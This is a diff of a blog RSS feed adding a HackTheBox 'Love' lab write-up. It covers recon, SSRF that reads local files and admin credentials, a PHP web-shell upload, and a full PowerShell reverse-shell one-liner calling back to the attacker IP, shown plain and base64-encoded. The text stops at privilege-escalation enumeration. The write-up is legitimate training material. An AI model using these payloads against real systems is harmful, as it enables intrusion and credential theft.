@@ -5,7 +5,384 @@
     <link>https://fahmifj.github.io/tags/msfvenom/</link>
     <description>Recent content in msfvenom on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 17 Jul 2021 13:52:01 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/msfvenom/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 09 Aug 2021 05:38:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/msfvenom/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Love</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-love/</link>
+      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-love/</guid>
+      <description>SSRF in beginner-level</description>
+      <content:encoded><![CDATA[<p>Love is an easy Windows machine that starts with finding admin credentials of a voting system application by leveraging SSRF from an online file scanner. With these credentials, I&rsquo;m able to access the admin dashboard and leverages the photo upload functionality to drop a web shell. Using the web shell, I&rsquo;m able to gain an interactive shell access to the machine. Enumeration of the system finds that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access..</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SSRF</li>
+<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
+<li>(Alternative) PrintNightmare LPE</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>WinPEAS</li>
+<li>msfvenom</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan scan discovers a bunch of open ports.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ fscan 10.10.10.239 love
+nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.239
+Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+<span class="p">|</span>_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
+<span class="p">|</span> Not valid before: 2021-01-18T14:00:16
+<span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
+<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3306/tcp  open  mysql?
+<span class="p">|</span> fingerprint-strings: 
+<span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
+<span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title: Not Found
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
+<span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
+<span class="p">|</span> Not valid before: 2021-04-11T14:39:19
+<span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
+<span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
+SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
+</span><span class="s2">...[SNIP]...
+</span><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="s2">
+</span><span class="s2">Host script results:
+</span><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
+</span><span class="s2">| smb-os-discovery: 
+</span><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+</span><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
+</span><span class="s2">|   Computer name: Love
+</span><span class="s2">|   NetBIOS computer name: LOVE\x00
+</span><span class="s2">|   Workgroup: WORKGROUP\x00
+</span><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
+</span><span class="s2">| smb-security-mode: 
+</span><span class="s2">|   account_used: &lt;blank&gt;
+</span><span class="s2">|   authentication_level: user
+</span><span class="s2">|   challenge_response: supported
+</span><span class="s2">|_  message_signing: disabled (dangerous, but default)
+</span><span class="s2">| smb2-security-mode: 
+</span><span class="s2">|   2.02: 
+</span><span class="s2">|_    Message signing enabled but not required
+</span><span class="s2">| smb2-time: 
+</span><span class="s2">|   date: 2021-08-08T15:53:43
+</span><span class="s2">|_  start_date: N/A
+</span><span class="s2">
+</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
+</span></code></pre></div><p>Most notable services are:</p>
+<ul>
+<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
+<li>SMB on port 445, good start.</li>
+<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
+<li>WinRM on 5985/6, I will use this for lateral movement.</li>
+</ul>
+<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code></p>
+<pre><code>$ echo 'www.love.htb staging.love.htb' 
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «love» «10.10.14.51» 
+$ smbclient -N -L //10.10.10.239 
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div><h3 id="tcp-5000">TCP 5000</h3>
+<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
+<p><img class="img-container" src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  />
+</p>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
+10.10.10.239 <span class="m">4388</span>
+www.love.htb <span class="m">4388</span>
+</code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p>
+<p><img class="img-container" src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  />
+</p>
+<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
+<p><img class="img-container" src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  />
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
+<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
+/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
+/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
+/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
+/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
+/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
+/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
+/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
+/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
+/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
+/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
+/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
+/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+                                                             
+<span class="o">===============================================================</span>
+2021/08/08 13:18:01 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><h4 id="admin">/admin</h4>
+<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
+<p><img class="img-container" src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  />
+</p>
+<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
+<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
+<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
+<p><img class="img-container" src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  />
+</p>
+<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
+<p><img class="img-container" src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  />
+</p>
+<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener receives the following request.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ nc -nvlp <span class="m">80</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
+GET /iamf HTTP/1.1
+Host: 10.10.14.51
+Accept: */*
+</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 hash.</p>
+<p>Playing a bit with it reveals that it can render HTML.</p>
+<p><img class="img-container" src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  />
+</p>
+<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
+<h3 id="tcp-443---website">TCP 443 - Website</h3>
+<p>On HTTPS, the SSL certificate on leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
+<p><img class="img-container" src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  />
+</p>
+<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
+<p><img class="img-container" src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  />
+</p>
+<p><img class="img-container" src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  />
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-phoebe">Shell as phoebe</h3>
+<h4 id="ssrf">SSRF</h4>
+<p>The behaviour of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously inaccessible. This attack is often known as Server-Side Request Forgery (SSRF).</p>
+<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
+<p><img class="img-container" src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  />
+</p>
+<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, the access is limited to only allow from <code>127.0.0.1</code>.</p>
+<p>Accessing <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> returns the following results.</p>
+<p><img class="img-container" src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  />
+</p>
+<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
+<p><img class="img-container" src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  />
+</p>
+<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
+<p><img class="img-container" src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  />
+</p>
+<p>I can use that creds to access the admin dashboard.</p>
+<p><img class="img-container" src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  />
+</p>
+<h4 id="php-webshell">PHP webshell</h4>
+<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
+<p><img class="img-container" src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  />
+</p>
+<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
+<p><img class="img-container" src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  />
+</p>
+<p>When I reload the page, I see the voter is there with broken photo, and that because it loads php as image.</p>
+<p><img class="img-container" src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  />
+</p>
+<p>The web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as phoebe.</p>
+<p><img class="img-container" src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  />
+</p>
+<h4 id="interactive-shell-access">Interactive shell access</h4>
+<p>To get an interactive shell I will use a powershell one liner and encode it to base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ cat exploits/revshell.ps1
+<span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
+→ kali@kali «love» «10.10.14.51» 
+$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
+<span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
+</code></pre></div><p>I will setup a listener and leverage the web shell to execute the reverse shell payload.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
+</code></pre></div><p>On my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ rlwrap nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>
+
+PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
+65a5...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>The flag also accessible using SSRF.</p>
+<p><img class="img-container" src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  />
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-system">Shell as SYSTEM</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means app installation runs always run in elevated (SYSTEM) mode. This can be abused to install a malicious <code>msi</code> package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[+] Checking AlwaysInstallElevated
